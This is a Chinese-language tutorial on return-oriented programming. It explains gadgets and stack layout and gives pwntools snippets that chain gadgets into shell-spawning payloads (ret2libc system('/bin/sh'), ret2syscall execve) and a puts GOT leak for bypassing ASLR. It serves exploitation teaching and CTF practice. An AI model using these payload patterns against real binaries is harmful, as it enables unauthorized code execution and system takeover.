# ROP (Return-Oriented Programming) 基础

## 什么是 ROP

ROP 是一种利用技术，通过串联程序中已存在的代码片段（称为"gadgets"）来执行任意操作，绕过栈不可执行（NX/DEP）保护。

## 为什么需要 ROP

当栈被标记为不可执行（NX 保护开启）时，我们无法直接执行注入在栈上的 shellcode。ROP 通过复用程序本身的代码来实现我们的目标。

## Gadget 是什么

Gadget 是程序中以 `ret` 指令结尾的短小指令序列：

```asm
; 示例 gadget 1
pop rdi
ret

; 示例 gadget 2
pop rsi
pop r15
ret

; 示例 gadget 3
mov rax, rdi
ret
```

## ROP 链的原理

通过栈溢出，我们可以控制栈的内容。ROP 链就是在栈上布置一系列 gadget 地址和数据：

```
栈布局：
高地址
  ↑
  | [data3]
  | [gadget3 地址]
  | [data2]
  | [gadget2 地址]
  | [data1]
  | [gadget1 地址]  ← 返回地址指向这里
  ↓
低地址

执行流程：
1. 函数返回 → 跳转到 gadget1
2. gadget1 执行 → ret → 跳转到 gadget2
3. gadget2 执行 → ret → 跳转到 gadget3
4. ...
```

## 基础 ROP 示例：调用 system("/bin/sh")

### 目标

在 x86-64 中调用 `system("/bin/sh")`，需要：
- RDI = "/bin/sh" 的地址（第一个参数）
- RIP = system 函数地址

### ROP 链构造

```python
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# 找 gadgets
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]

# 找字符串和函数地址
binsh = next(elf.search(b'/bin/sh'))  # 或在 libc 中找
system = elf.plt['system']  # 或 libc.symbols['system']

# 构造 ROP 链
offset = 72
payload = b'A' * offset
payload += p64(pop_rdi_ret)    # gadget: pop rdi; ret
payload += p64(binsh)          # 数据: "/bin/sh" 地址
payload += p64(system)         # 函数: system 地址
```

### 执行过程

```
1. 函数返回 → RIP = pop_rdi_ret
2. 执行 pop rdi → RDI = binsh（从栈弹出）
3. 执行 ret → RIP = system（从栈弹出）
4. 执行 system(RDI) → system("/bin/sh")
5. 获得 shell！
```

## 使用 pwntools 查找 Gadgets

```python
elf = ELF('./vuln')
rop = ROP(elf)

# 自动查找 gadget
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

# 查看所有 gadgets
print(rop.gadgets)

# 使用外部工具 ROPgadget
os.system('ROPgadget --binary ./vuln | grep "pop rdi"')
```

## 常用 Gadgets 模式

```asm
; 设置第一个参数 (RDI)
pop rdi
ret

; 设置第二个参数 (RSI)
pop rsi
ret

; 设置第三个参数 (RDX) - 比较少见
pop rdx
ret

; 栈迁移
pop rsp
ret

; 条件跳转控制
test rax, rax
jne <addr>
ret
```

## ROP 的常见应用

### 1. ret2libc

调用 libc 中的函数（如 system、execve）：

```python
# 调用 system("/bin/sh")
payload = b'A' * offset
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)
```

### 2. ret2syscall

直接构造系统调用：

```python
# execve("/bin/sh", NULL, NULL)
# 需要：RAX=59, RDI="/bin/sh", RSI=0, RDX=0
payload = b'A' * offset
payload += p64(pop_rax_ret) + p64(59)
payload += p64(pop_rdi_ret) + p64(binsh_addr)
payload += p64(pop_rsi_ret) + p64(0)
payload += p64(pop_rdx_ret) + p64(0)
payload += p64(syscall_ret)
```

### 3. 信息泄露

泄露 libc 地址以绕过 ASLR：

```python
# 调用 puts(puts_got) 泄露 puts 地址
payload1 = b'A' * offset
payload1 += p64(pop_rdi_ret)
payload1 += p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(main_addr)  # 返回 main 继续利用

p.sendline(payload1)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
log.success(f'libc base: {hex(libc.address)}')

# 第二次利用，用泄露的 libc 地址
```

## ROP 调试技巧

### 用 GDB 单步跟踪

```bash
# 在 ROP 链开始处设断点
(gdb) break *0x401234  # vulnerable 函数返回处

# 查看栈上的 ROP 链
(gdb) x/20gx $rsp

# 单步执行每个 gadget
(gdb) si
(gdb) si

# 查看寄存器变化
(gdb) info registers
```

### 验证 ROP 链

```python
# 打印 ROP 链
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
print(rop.dump())  # 显示 ROP 链结构
```

## 保护机制对 ROP 的影响

- **NX/DEP**：这正是 ROP 要绕过的保护
- **ASLR/PIE**：需要先信息泄露，获取地址后才能构造 ROP 链
- **Stack Canary**：需要先泄露 canary 值
- **RELRO**：Full RELRO 会导致 GOT 不可写，影响某些 ROP 技术

## 总结

ROP 的核心思路：
1. 在程序中找到有用的 gadgets
2. 通过栈溢出控制栈内容
3. 在栈上布置 gadget 地址和数据
4. 利用 ret 指令串联 gadgets
5. 实现任意操作（调用函数、系统调用等）

ROP 是现代漏洞利用的核心技术之一！
